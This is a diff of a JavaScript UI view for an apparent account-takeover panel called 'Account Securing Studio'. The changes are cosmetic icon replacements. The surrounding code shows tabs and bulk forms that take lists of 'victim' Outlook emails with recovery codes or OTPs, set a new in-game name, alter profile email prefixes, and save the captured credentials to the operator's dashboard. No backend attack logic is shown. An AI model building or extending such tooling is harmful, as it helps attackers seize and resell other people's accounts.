@@ -7,29 +7,29 @@ const SecureView = {
     container.innerHTML = `
       <div class="card">
         <div class="card-header">
-          <span class="card-title"><i class="fas fa-lock"></i> Account Securing Studio</span>
+          <span class="card-title"><re-icon icon="lock" size="18" aria-hidden="true"></re-icon> Account Securing Studio</span>
           <span class="badge-tag info">Live Engine</span>
         </div>
 
         <!-- Securing Tabs -->
         <div class="tabs-header" style="margin-top:14px;">
           <button class="tab-btn active" id="sec-tab-btn-otp" onclick="SecureView.switchTab('otp')">
-            <i class="fas fa-sms"></i> OTP Secure
+            <re-icon icon="sms" size="15" aria-hidden="true"></re-icon> OTP Secure
           </button>
           <button class="tab-btn" id="sec-tab-btn-rec" onclick="SecureView.switchTab('rec')">
-            <i class="fas fa-key"></i> Recovery Code
+            <re-icon icon="key" size="15" aria-hidden="true"></re-icon> Recovery Code
           </button>
           <button class="tab-btn" id="sec-tab-btn-zyger" onclick="SecureView.switchTab('zyger')">
-            <i class="fas fa-shield-alt"></i> Zyger (TOTP)
+            <re-icon icon="shield" size="15" aria-hidden="true"></re-icon> Zyger (TOTP)
           </button>
           <button class="tab-btn" id="sec-tab-btn-bulk-rec" onclick="SecureView.switchTab('bulk-rec')">
-            <i class="fas fa-layer-group"></i> Bulk Recovery
+            <re-icon icon="layers" size="15" aria-hidden="true"></re-icon> Bulk Recovery
           </button>
           <button class="tab-btn" id="sec-tab-btn-bulk-otp" onclick="SecureView.switchTab('bulk-otp')">
-            <i class="fas fa-tasks"></i> Bulk OTP
+            <re-icon icon="tasks" size="15" aria-hidden="true"></re-icon> Bulk OTP
           </button>
           <button class="tab-btn" id="sec-tab-btn-rules" onclick="SecureView.switchTab('rules')">
-            <i class="fas fa-sliders-h"></i> Securing Rules & Profile
+            <re-icon icon="slider-horizontal" size="15" aria-hidden="true"></re-icon> Securing Rules & Profile
           </button>
         </div>
 
@@ -53,7 +53,7 @@ const SecureView = {
                 <input type="text" id="otp-sec-ign" class="form-input" placeholder="3-16 characters" />
               </div>
               <button type="submit" id="btn-submit-otp" class="btn btn-primary" style="width:100%;padding:12px;">
-                <i class="fas fa-shield-alt"></i> Execute OTP Secure
+                <re-icon icon="shield" size="16" aria-hidden="true"></re-icon> Execute OTP Secure
               </button>
             </form>
           </div>
@@ -77,7 +77,7 @@ const SecureView = {
                 <input type="text" id="rec-sec-ign" class="form-input" placeholder="3-16 characters" />
               </div>
               <button type="submit" id="btn-submit-rec" class="btn btn-primary" style="width:100%;padding:12px;">
-                <i class="fas fa-key"></i> Execute Recovery Code Secure
+                <re-icon icon="key" size="16" aria-hidden="true"></re-icon> Execute Recovery Code Secure
               </button>
             </form>
           </div>
@@ -105,7 +105,7 @@ const SecureView = {
                 <input type="text" id="zyger-sec-ign" class="form-input" placeholder="3-16 characters" />
               </div>
               <button type="submit" id="btn-submit-zyger" class="btn btn-primary" style="width:100%;padding:12px;">
-                <i class="fas fa-lock"></i> Execute Zyger Secure
+                <re-icon icon="lock" size="16" aria-hidden="true"></re-icon> Execute Zyger Secure
               </button>
             </form>
           </div>
@@ -121,7 +121,7 @@ const SecureView = {
                           placeholder="victim1@outlook.com:ABCDE-FGHIJ-KLMNO-PQRST-UVWXY&#10;victim2@outlook.com:12345-67890-ABCDE-FGHIJ-KLMNO:NewIgn"></textarea>
               </div>
               <button class="btn btn-primary" onclick="SecureView.submitBulkRec()">
-                <i class="fas fa-play"></i> Start Bulk Securing
+                <re-icon icon="play" size="14" aria-hidden="true"></re-icon> Start Bulk Securing
               </button>
 
               <div id="bulk-rec-results" style="margin-top:20px;display:none;">
@@ -154,7 +154,7 @@ const SecureView = {
                           placeholder="victim1@outlook.com:482910&#10;victim2@outlook.com:918234:CoolPlayer"></textarea>
               </div>
               <button class="btn btn-primary" onclick="SecureView.submitBulkOtp()">
-                <i class="fas fa-play"></i> Start Bulk OTP Securing
+                <re-icon icon="play" size="14" aria-hidden="true"></re-icon> Start Bulk OTP Securing
               </button>
 
               <div id="bulk-otp-results" style="margin-top:20px;display:none;">
@@ -224,7 +224,7 @@ const SecureView = {
         title: 'Account Secured!',
         bodyHtml: `
           <div style="text-align:center;padding:20px 0;">
-            <i class="fas fa-check-circle fa-3x" style="color:#10b981;margin-bottom:12px;"></i>
+            <re-icon icon="check-circle" size="48" style="color:#10b981;margin-bottom:12px;" aria-hidden="true"></re-icon>
             <h3>Account Successfully Secured</h3>
             <p style="color:var(--text-muted);margin:8px 0;">UID: <code>${res.uid}</code></p>
             <p style="font-size:0.85rem;color:var(--text-dim);">The account credentials have been saved to your dashboard accounts.</p>
@@ -256,7 +256,7 @@ const SecureView = {
         title: 'Account Secured via Recovery Code!',
         bodyHtml: `
           <div style="text-align:center;padding:20px 0;">
-            <i class="fas fa-check-circle fa-3x" style="color:#10b981;margin-bottom:12px;"></i>
+            <re-icon icon="check-circle" size="48" style="color:#10b981;margin-bottom:12px;" aria-hidden="true"></re-icon>
             <h3>Account Successfully Secured</h3>
             <p style="color:var(--text-muted);margin:8px 0;">UID: <code>${res.uid}</code></p>
           </div>
@@ -375,7 +375,7 @@ const SecureView = {
             <!-- Automation Toggles -->
             <div>
               <h4 style="font-size:0.95rem;font-weight:600;margin-bottom:14px;color:var(--primary);">
-                <i class="fas fa-cogs"></i> Security Automations
+                <re-icon icon="gear" size="16" aria-hidden="true"></re-icon> Security Automations
               </h4>
               <div style="display:flex;flex-direction:column;gap:8px;">
                 <label class="form-checkbox-label">
@@ -428,7 +428,7 @@ const SecureView = {
             <!-- Profile & Personalization -->
             <div>
               <h4 style="font-size:0.95rem;font-weight:600;margin-bottom:14px;color:var(--primary);">
-                <i class="fas fa-user-edit"></i> Profile Alteration
+                <re-icon icon="user-edit" size="16" aria-hidden="true"></re-icon> Profile Alteration
               </h4>
               <div class="form-group">
                 <label class="form-label">Email Prefix</label>
@@ -459,7 +459,7 @@ const SecureView = {
 
           <div style="margin-top:20px;padding-top:16px;border-top:1px solid var(--border-color);display:flex;justify-content:flex-end;">
             <button type="submit" class="btn btn-primary">
-              <i class="fas fa-save"></i> Save Rules & Profile
+              <re-icon icon="floppy" size="16" aria-hidden="true"></re-icon> Save Rules & Profile
             </button>
           </div>
         </form>
